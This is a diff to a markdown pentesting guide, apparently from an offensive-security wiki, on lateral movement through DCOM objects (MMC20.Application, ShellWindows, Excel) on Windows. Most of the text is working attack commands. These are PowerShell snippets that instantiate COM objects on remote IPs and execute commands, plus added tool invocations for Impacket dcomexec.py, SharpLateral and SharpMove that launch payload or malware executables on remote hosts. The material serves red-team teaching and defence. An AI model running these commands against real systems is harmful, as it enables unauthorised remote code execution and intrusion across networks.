@@ -16,7 +16,7 @@ The COM object, [MMC Application Class (MMC20.Application)](https://technet.micr
 
 This feature facilitates the execution of commands over a network through a DCOM application. To interact with DCOM remotely as an admin, PowerShell can be utilized as follows:
 
-```powershell
+```bash
 [activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
 ```
 
@@ -24,14 +24,14 @@ This command connects to the DCOM application and returns an instance of the COM
 
 Check methods:
 
-```powershell
+```bash
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com.Document.ActiveView | Get-Member
 ```
 
 Get RCE:
 
-```powershell
+```bash
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com | Get-Member
 
@@ -54,11 +54,16 @@ For `ShellWindows`, which lacks a ProgID, the .NET methods `Type.GetTypeFromCLSI
 
 Example PowerShell commands were provided to instantiate the object and execute commands remotely:
 
-```powershell
+```bash
+# Example
 $com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
 $obj = [System.Activator]::CreateInstance($com)
 $item = $obj.Item()
 $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
+
+# Need to upload the file to execute
+$COM = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.APPLICATION", "192.168.52.100"))
+$COM.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\calc.exe", $Null, $Null, "7")
 ```
 
 ### Lateral Movement with Excel DCOM Objects
@@ -67,7 +72,7 @@ Lateral movement can be achieved by exploiting DCOM Excel objects. For detailed 
 
 The Empire project provides a PowerShell script, which demonstrates the utilization of Excel for remote code execution (RCE) by manipulating DCOM objects. Below are snippets from the script available on [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), showcasing different methods to abuse Excel for RCE:
 
-```powershell
+```bash
 # Detection of Office version
 elseif ($Method -Match "DetectOffice") {
     $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
@@ -102,13 +107,31 @@ Two tools are highlighted for automating these techniques:
 SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 ```
 
+- [SharpMove](https://github.com/0xthirteen/SharpMove):
+
+```bash
+SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
+```
+
 ## Automatic Tools
 
 - The Powershell script [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) allows to easily invoke all the commented ways to execute code in other machines.
+- You can use Impacket's `dcomexec.py` to execute commands on remote systems using DCOM.
+
+```bash
+dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"
+```
+
 - You could also use [**SharpLateral**](https://github.com/mertdas/SharpLateral):
 
 ```bash
 SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
+```
+
+- You could also use [**SharpMove**](https://github.com/0xthirteen/SharpMove)
+
+```bash
+SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
 ```
 
 ## References
